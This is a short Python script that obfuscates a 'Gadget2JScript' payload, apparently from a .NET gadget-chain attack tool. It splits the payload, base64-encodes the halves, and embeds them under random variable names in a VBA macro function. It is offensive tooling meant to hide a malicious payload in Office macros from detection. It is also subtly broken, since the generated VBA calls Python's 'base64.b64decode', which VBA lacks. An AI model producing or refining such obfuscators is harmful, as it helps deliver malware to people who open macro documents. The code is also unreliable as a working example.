import base64
import random
import string

def obfuscate(gadget2_jscript: str) -> str:
    # Split the Gadget2JScript into two stages
    stage1, stage2 = gadget2_jscript[:len(gadget2_jscript)//2], gadget2_jscript[len(gadget2_jscript)//2:]

    # Generate random variable names for the two stages
    stage1_varname = ''.join(random.choices(string.ascii_lowercase, k=10))
    stage2_varname = ''.join(random.choices(string.ascii_lowercase, k=10))

    # Encode the two stages as base64
    encoded_stage1 = base64.b64encode(stage1.encode()).decode()
    encoded_stage2 = base64.b64encode(stage2.encode()).decode()

    # Create the VBA script
    vba_script = f"""
        Function deobfuscate() As String
            Dim {stage1_varname} As String, {stage2_varname} As String
            {stage1_varname} = "{encoded_stage1}"
            {stage2_varname} = "{encoded_stage2}"
            deobfuscate = base64.b64decode({stage1_varname}) & base64.b64decode({stage2_varname})
        End Function
    """

    return vba_script

# Read the Gadget2JScript from a file
with open("gadget2_jscript.txt", "r") as f:
    gadget2_jscript = f.read()

# Obfuscate the Gadget2JScript
obfuscated_vba = obfuscate(gadget2_jscript)

# Save the obfuscated VBA to a file
with open("obfuscated.vba", "w") as f:
    f.write(obfuscated_vba)
